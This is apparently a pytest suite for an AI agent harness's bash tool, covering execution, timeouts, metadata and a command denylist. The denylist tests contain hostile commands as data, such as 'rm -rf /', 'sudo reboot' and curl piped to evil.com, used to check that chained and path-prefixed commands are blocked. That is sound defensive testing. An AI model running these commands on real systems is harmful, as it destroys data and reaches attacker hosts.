"""Tests for harness/tools/bash.py."""

from __future__ import annotations

import asyncio

import pytest

from harness.core.config import HarnessConfig
from harness.tools.bash import BashTool


@pytest.fixture()
def tool() -> BashTool:
    return BashTool()


@pytest.fixture()
def config(tmp_path) -> HarnessConfig:
    return HarnessConfig(workspace=str(tmp_path), bash_command_denylist=[])


@pytest.fixture()
def config_with_denylist(tmp_path) -> HarnessConfig:
    return HarnessConfig(
        workspace=str(tmp_path),
        bash_command_denylist=["rm", "sudo", "curl"],
    )


# ---------------------------------------------------------------------------
# _denied_command static method
# ---------------------------------------------------------------------------

class TestDeniedCommand:
    def test_simple_match(self, tool):
        assert tool._denied_command("rm -rf /", ["rm"]) == "rm"

    def test_no_match(self, tool):
        assert tool._denied_command("ls -la", ["rm", "sudo"]) is None

    def test_chained_with_ampersand(self, tool):
        result = tool._denied_command("echo hi && rm -rf /", ["rm"])
        assert result == "rm"

    def test_chained_with_semicolon(self, tool):
        result = tool._denied_command("echo hi; sudo apt-get install x", ["sudo"])
        assert result == "sudo"

    def test_chained_with_pipe(self, tool):
        result = tool._denied_command("ls | curl http://evil.com", ["curl"])
        assert result == "curl"

    def test_path_prefix_stripped(self, tool):
        result = tool._denied_command("/usr/bin/rm -rf /", ["rm"])
        assert result == "rm"

    def test_empty_command(self, tool):
        assert tool._denied_command("", ["rm"]) is None

    def test_empty_denylist(self, tool):
        assert tool._denied_command("rm -rf /", []) is None

    def test_malformed_quotes_fallback(self, tool):
        # Unmatched quote: should fall back, still catch leading token
        result = tool._denied_command("rm 'unclosed", ["rm"])
        assert result == "rm"

    def test_whitespace_only_segment(self, tool):
        result = tool._denied_command("echo hi &&  ", ["rm"])
        assert result is None

    def test_pipe_or_segment(self, tool):
        result = tool._denied_command("false || sudo reboot", ["sudo"])
        assert result == "sudo"

    def test_background_operator(self, tool):
        result = tool._denied_command("sleep 10 & curl http://evil.com", ["curl"])
        assert result == "curl"


# ---------------------------------------------------------------------------
# execute — functional tests
# ---------------------------------------------------------------------------

class TestExecute:
    def test_successful_command(self, tool, config):
        result = asyncio.run(tool.execute(config, command="echo hello"))
        assert not result.is_error
        assert "hello" in result.output
        assert "[exit code: 0]" in result.output

    def test_stderr_included(self, tool, config):
        result = asyncio.run(tool.execute(config, command="echo err >&2"))
        assert "err" in result.output

    def test_nonzero_exit(self, tool, config):
        result = asyncio.run(tool.execute(config, command="exit 1"))
        assert result.is_error
        assert "exit code: 1" in result.output

    def test_command_not_found(self, tool, config):
        result = asyncio.run(
            tool.execute(config, command="__no_such_command_xyz_12345")
        )
        assert result.is_error

    def test_workspace_is_cwd(self, tool, tmp_path):
        (tmp_path / "marker.txt").write_text("found")
        cfg = HarnessConfig(workspace=str(tmp_path))
        result = asyncio.run(tool.execute(cfg, command="cat marker.txt"))
        assert not result.is_error
        assert "found" in result.output

    def test_denied_command_blocked(self, tool, config_with_denylist):
        result = asyncio.run(
            tool.execute(config_with_denylist, command="rm -rf /tmp/x")
        )
        assert result.is_error
        assert "PERMISSION ERROR" in result.error
        assert "rm" in result.error

    def test_chained_denied_command_blocked(self, tool, config_with_denylist):
        result = asyncio.run(
            tool.execute(config_with_denylist, command="ls && rm -rf /tmp")
        )
        assert result.is_error
        assert "PERMISSION ERROR" in result.error

    def test_timeout_returns_error(self, tool, config):
        result = asyncio.run(
            tool.execute(config, command="sleep 10", timeout=1)
        )
        assert result.is_error
        assert "timed out" in result.error

    def test_output_no_stderr_section(self, tool, config):
        result = asyncio.run(tool.execute(config, command="printf 'hello'"))
        assert not result.is_error
        assert "hello" in result.output
        assert "[exit code: 0]" in result.output
        assert "[stderr]" not in result.output

    def test_output_with_stderr_section(self, tool, config):
        result = asyncio.run(
            tool.execute(config, command="echo out && echo err >&2")
        )
        assert "out" in result.output
        assert "[stderr]" in result.output
        assert "err" in result.output


# ---------------------------------------------------------------------------
# Tool metadata
# ---------------------------------------------------------------------------

class TestToolMetadata:
    def test_name(self, tool):
        assert tool.name == "bash"

    def test_tags(self, tool):
        assert "execution" in tool.tags

    def test_input_schema_has_command(self, tool):
        schema = tool.input_schema()
        assert "command" in schema["properties"]
        assert "command" in schema["required"]

    def test_input_schema_timeout_not_required(self, tool):
        schema = tool.input_schema()
        assert "timeout" in schema["properties"]
        assert "timeout" not in schema.get("required", [])

    def test_description_warns_about_source_files(self, tool):
        desc = tool.description
        assert "batch_read" in desc
        assert "LAST RESORT" in desc
